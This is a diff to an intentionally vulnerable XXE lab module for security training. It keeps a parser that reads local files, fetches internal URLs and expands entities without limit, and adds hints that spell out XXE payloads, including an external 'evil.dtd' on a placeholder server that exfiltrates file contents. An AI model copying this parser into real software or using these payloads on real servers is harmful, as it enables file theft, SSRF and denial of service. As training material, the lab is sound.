@@ -1,11 +1,11 @@
-// XXE Injection module — intentionally vulnerable XML importer.
+// XXE Injection module , intentionally vulnerable XML importer.
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const http = require('http');
 const https = require('https');
 
-const { page, esc, flagBox, hintBox, brief } = require('../../lib/page');
+const { brief, esc, fixPanel, flagBox, hintBox, hintLadder, page, toolsPill, trackBanner } = require('../../lib/page');
 const { award } = require('../../lib/flags');
 
 const router = express.Router();
@@ -34,7 +34,7 @@ function fetchUrl(url) {
 // Resolve one SYSTEM entity URI to its content.
 async function resolveEntity(uri) {
   if (uri.startsWith('file://')) {
-    // VULN: arbitrary local file read — SYSTEM file:// entities are honored with no allowlist.
+    // VULN: arbitrary local file read , SYSTEM file:// entities are honored with no allowlist.
     const filePath = uri.slice('file://'.length);
     try {
       return fs.readFileSync(filePath, 'utf8');
@@ -43,7 +43,7 @@ async function resolveEntity(uri) {
     }
   }
   if (uri.startsWith('http://') || uri.startsWith('https://')) {
-    // VULN: SSRF via external entity — any http(s) URL is fetched server-side.
+    // VULN: SSRF via external entity , any http(s) URL is fetched server-side.
     return await fetchUrl(uri);
   }
   return `[entity error: unsupported scheme in "${uri}"]`;
@@ -87,6 +87,7 @@ router.get('/', (req, res) => {
       internal secret endpoint (e.g. <code>http://127.0.0.1:PORT/ssrf/internal/secret</code>)
       and look for <code>SSRF-INTERNAL-9921</code> in the output.
     `)}
+    ${trackBanner(module.exports)}
     <h2>Challenges</h2>
     ${vulnList}`;
   res.send(page('XXE Injection', body));
@@ -117,9 +118,11 @@ router.post('/import', async (req, res) => {
   // VULN: success of the attack is measured on the raw expanded output.
   if (expanded.includes('XXE-SECRET-4471')) {
     flags += flagBox(award(req, 'xxe', 'file'));
+    flags += fixPanel('xxe', 'file');
   }
   if (expanded.includes('SSRF-INTERNAL-9921')) {
     flags += flagBox(award(req, 'xxe', 'ssrf'));
+    flags += fixPanel('xxe', 'ssrf');
   }
 
   const body = `
@@ -321,6 +324,7 @@ router.post('/billion', (req, res) => {
   // parser busy regardless of machine speed; the size gate de-flakes fast hardware).
   if ((elapsed > 1500 || expanded.length > 5000000) && /<!ENTITY/i.test(xml) && /&\w+;/.test(xml)) {
     flags += flagBox(award(req, 'xxe', 'xxe-billion-laughs'));
+    flags += fixPanel('xxe', 'xxe-billion-laughs');
   }
   res.send(page('Billion Laughs', `
     <h2>Parse result</h2>
@@ -364,6 +368,7 @@ router.post('/dtd', async (req, res) => {
   // VULN: award only when this request made the server exfiltrate the secret to the collector.
   if (hits.length > 0) {
     flags += flagBox(award(req, 'xxe', 'xxe-external-dtd'));
+    flags += fixPanel('xxe', 'xxe-external-dtd');
   }
   const dataMatch = expanded.match(/<data[^>]*>([\s\S]*?)<\/data>/i);
   const shown = dataMatch ? dataMatch[1] : expanded;
@@ -404,6 +409,7 @@ router.post('/svg', async (req, res) => {
   let flags = '';
   if (expanded.includes('XXE-SECRET-4471')) {
     flags += flagBox(award(req, 'xxe', 'xxe-svg'));
+    flags += fixPanel('xxe', 'xxe-svg');
   }
   res.send(page('XXE in SVG', `
     <h2>Extraction result</h2>
@@ -438,6 +444,7 @@ router.post('/xinclude', async (req, res) => {
   let flags = '';
   if (out.includes('XXE-SECRET-4471')) {
     flags += flagBox(award(req, 'xxe', 'xxe-xinclude'));
+    flags += fixPanel('xxe', 'xxe-xinclude');
   }
   res.send(page('XInclude', `
     <h2>Import result</h2>
@@ -479,6 +486,7 @@ router.post('/param', async (req, res) => {
   // VULN: award only when this request made the server exfiltrate the secret to the collector.
   if (hits.length > 0) {
     flags += flagBox(award(req, 'xxe', 'xxe-param-oob'));
+    flags += fixPanel('xxe', 'xxe-param-oob');
   }
   const dataMatch = expanded.match(/<data[^>]*>([\s\S]*?)<\/data>/i);
   const shown = dataMatch ? dataMatch[1] : expanded;
@@ -518,6 +526,7 @@ router.post('/soap', async (req, res) => {
   let flags = '';
   if (expanded.includes('XXE-SECRET-4471')) {
     flags += flagBox(award(req, 'xxe', 'xxe-soap'));
+    flags += fixPanel('xxe', 'xxe-soap');
   }
   res.send(page('SOAP XXE', `
     <h2>Service response</h2>
@@ -534,12 +543,16 @@ module.exports = {
   tagline: 'Trick a naive XML parser into reading files and hitting internal URLs.',
   description: 'The XML importer expands external entities with a hand-rolled regex parser: file:// URIs are read from disk and http:// URIs are fetched server-side. Use it to read a local secret file, then chain into the SSRF module\'s internal endpoint.',
   difficulty: 'Intermediate',
+  track: 'Injection',
+  prerequisites: ['sqli'],
   vulns: [
     {
       id: 'file',
       name: 'XXE File Read',
       difficulty: 'Medium',
       hint: 'Declare an external entity with a file:// URI pointing at the module\'s secret.txt (absolute path), then reference &name; inside <data>.',
+      hints: ["The app parses your XML. Does it resolve external entities?", "A DOCTYPE with <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> makes the parser read the file. Reference &xxe; where the output appears.", "Submit XML with <!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///path/to/secret\">]> and use &xxe; in the body."],
+      tools: "B, C",
       how: 'Inject an XML external entity (SYSTEM "file://...") and get the server to read a local file into the import result.',
     },
     {
@@ -547,6 +560,8 @@ module.exports = {
       name: 'SSRF via XXE',
       difficulty: 'Hard',
       hint: 'The same expander also fetches http:// URLs. Point an entity at the SSRF module\'s internal secret endpoint and chain it: XXE → SSRF → internal secret.',
+      hints: ["Entities can have http:// URLs too. What happens when the parser fetches one?", "An external entity with SYSTEM \"http://127.0.0.1:PORT/...\" makes the server request that URL. It's SSRF via XML.", "Use <!ENTITY xxe SYSTEM \"http://127.0.0.1:PORT/xxe/internal\"> and reference &xxe;."],
+      tools: "C",
       how: 'Use an XML external entity with an http:// SYSTEM URI to make the server request an internal endpoint and leak its response.',
     },
     {
@@ -554,6 +569,8 @@ module.exports = {
       name: 'Billion Laughs (Entity-Expansion DoS)',
       difficulty: 'Medium',
       hint: 'The billion endpoint expands internal entities recursively with no depth limit. Define entities that reference each other and watch the parse time.',
+      hints: ["Entities can reference other entities. What if they reference each other exponentially?", "The billion laughs: define lol as 10 x's, lol2 as 10 &lol;, etc. The expansion grows exponentially and the parser chokes.", "Submit the classic nested entity payload. The flag lands when expansion time/size exceeds the threshold."],
+      tools: "C",
       how: 'Submit nested <!ENTITY> definitions (lol, lol2 ... lol7) so expansion explodes exponentially and parse time exceeds 1.5s.',
     },
     {
@@ -561,6 +578,8 @@ module.exports = {
       name: 'External DTD Exfiltration',
       difficulty: 'Medium',
       hint: 'Host a malicious DTD on the in-lab OOB collector, pull it in with a parameter entity, and make the DTD ping the collector back with the file content in the URL.',
+      hints: ["The DTD doesn't have to be inline. Can it be fetched from a URL?", "An external DTD (SYSTEM \"http://your-server/evil.dtd\") lets you define parameter entities that exfiltrate file content OOB.", "Host a DTD that reads the secret and pings your collector. The flag lands when the collector receives it."],
+      tools: "C",
       how: 'Upload a DTD that reads secret.txt into %file; and declares a pingback entity to /xxe/collector/log?d=%file;, then import XML that fetches your DTD.',
     },
     {
@@ -568,6 +587,8 @@ module.exports = {
       name: 'XXE in Uploaded SVG',
       difficulty: 'Medium',
       hint: 'The SVG text extractor runs the same entity-expanding parser. An SVG is just XML, and XML can carry a DOCTYPE.',
+      hints: ["SVG files are XML. Do uploaded SVGs get parsed with entities resolved?", "An SVG with a DOCTYPE declaring an external entity will have it resolved when the server parses the SVG.", "Upload an SVG with <!ENTITY xxe SYSTEM \"file:///...\"> and reference it in the SVG text."],
+      tools: "B, C",
       how: 'Upload an SVG whose DOCTYPE declares a file:// entity for secret.txt and references it inside a <text> element.',
     },
     {
@@ -575,6 +596,8 @@ module.exports = {
       name: 'XInclude File Inclusion',
       difficulty: 'Medium',
       hint: 'The xinclude endpoint honors xi:include tags. The href is resolved server-side with the same file:// and http:// support as entities.',
+      hints: ["There's another XML inclusion mechanism besides entities. What is it?", "XInclude (<xi:include>) pulls in external resources. It's XXE by another name.", "Submit <xi:include href=\"file:///path/to/secret\" parse=\"text\"/> with the XInclude namespace."],
+      tools: "B, C",
       how: 'Submit XML with <xi:include href="file:///.../secret.txt" parse="text"/> and read the spliced content in the output.',
     },
     {
@@ -582,6 +605,8 @@ module.exports = {
       name: 'Parameter-Entity OOB Exfiltration',
       difficulty: 'Hard',
       hint: 'Chain parameter entities entirely inline: %file; reads the secret, %oob; declares a new entity whose URL carries %file; to the in-lab collector. Mind the quoting.',
+      hints: ["Parameter entities (%) work in the DTD. Can they exfiltrate data out-of-band?", "Chain: %file reads the secret, %oob builds a URL with it, and the parser fetches that URL. Check the collector.", "Submit the parameter-entity OOB payload and watch the collector log for the secret."],
+      tools: "C",
       how: 'Submit a DOCTYPE where %oob; injects <!ENTITY exfil SYSTEM \'http://.../xxe/collector/log?d=%file;\'> (single quotes!), then reference &exfil; to fire the pingback.',
     },
     {
@@ -589,6 +614,8 @@ module.exports = {
       name: 'XXE in SOAP Endpoint',
       difficulty: 'Easy',
       hint: 'A second XML endpoint with the same naive parser, this time expecting a SOAP envelope. The DOCTYPE rides along the same way.',
+      hints: ["SOAP messages are XML envelopes. Does this SOAP endpoint parse entities?", "Same XXE as the basic lab, wrapped in a SOAP envelope. The parser doesn't care about the wrapper.", "Send the file-read entity payload inside a SOAP <Envelope>."],
+      tools: "B, C",
       how: 'Send a SOAP envelope whose DOCTYPE declares a file:// entity for secret.txt and references it inside <soap:Body>.',
     },
   ],
